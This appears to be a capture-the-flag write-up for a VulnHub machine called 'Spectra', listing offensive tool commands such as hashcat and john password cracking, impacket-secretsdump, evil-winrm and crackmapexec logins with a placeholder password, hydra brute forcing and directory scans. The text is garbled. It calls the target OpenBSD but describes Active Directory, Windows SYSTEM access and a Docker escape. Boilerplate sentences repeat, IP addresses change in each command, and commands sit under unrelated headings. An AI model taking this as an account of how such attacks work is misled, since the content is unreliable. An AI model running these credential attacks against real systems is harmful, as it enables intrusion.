---
TitleSEO: "VulnHub — Spectra (Medium OpenBSD) | ZureFX"
TitlePost: "VulnHub — Spectra (Medium OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Spectra. XSS and Sudo Misconfiguration to achieve medium compromise on OpenBSD."
Keywords: "active directory, linux, web, pwntilldawn, windows"
URL: "https://zurefx.github.io/writeups/htb-spectra-284.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-spectra-284/"
Date: "2024-12-05"
Tags: "Active Directory, Linux, Web, PwnTillDawn, Windows"
Section: "writeups"
Lang: "en"
main_img: "htb-spectra-284"
Permalink: "/writeups/htb-spectra-284.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Spectra** is rated **Medium** on VulnHub. It runs **OpenBSD** and the IP address during this analysis was `10.87.233.43`.

### Objectives

The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The kernel version was outdated and vulnerable to a publicly known exploit. Unconstrained delegation was enabled on the compromised machine.

### Service Enumeration

Unconstrained delegation was enabled on the compromised machine. Post-exploitation enumeration revealed a path to domain administrator privileges. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.120.170.205
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.105.179.148/FUZZ
evil-winrm -i 10.27.228.225 -u administrator -p 'P@ssw0rd!'
```

The service was running without proper input validation, leading to injection vulnerabilities. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Web Enumeration

The service account had excessive permissions assigned in Active Directory. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
crackmapexec smb 10.39.97.34 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.15.244.92 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The target system was identified as running a vulnerable version of the service. Authentication bypass was achieved through careful manipulation of the login mechanism. Lateral movement was facilitated by reusing discovered credentials across services.

## Exploitation

### Vulnerability Identification

Privilege escalation was possible due to misconfigured sudo permissions. The service account had excessive permissions assigned in Active Directory. The service account had excessive permissions assigned in Active Directory.

Key finding: **AS-REP Roasting**.

The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Initial Access

The web application was vulnerable to Server-Side Template Injection (SSTI). Initial enumeration revealed several interesting open ports on the target.

```bash
nmap -sCV -p3389,636,21 10.88.118.122 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.79.105.61/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```

The scheduled task ran with elevated privileges and could be abused for escalation. Group Policy Preferences contained encrypted but recoverable credentials. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Privilege Escalation

### Enumeration

Initial enumeration revealed several interesting open ports on the target. The backup files contained sensitive information that should not have been accessible. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.97.217.190
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.62.189.59 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p587,464,3389 10.55.57.236 -oN scan.txt
```

### Exploitation

The service account had excessive permissions assigned in Active Directory. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
feroxbuster -h
```

Network traffic analysis revealed unencrypted communications containing user credentials. Command injection was possible through unsanitized user input in the search functionality.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Group Policy Preferences contained encrypted but recoverable credentials. The database credentials were hardcoded in the application source code.

## Summary

### Tools Used

- `socat`
- `hashcat`
- `dcomexec`
- `netcat`
- `GetNPUsers`
- `gobuster`

### Key Takeaways

- XSS
- Sudo Misconfiguration
- Docker Escape
- AS-REP Roasting
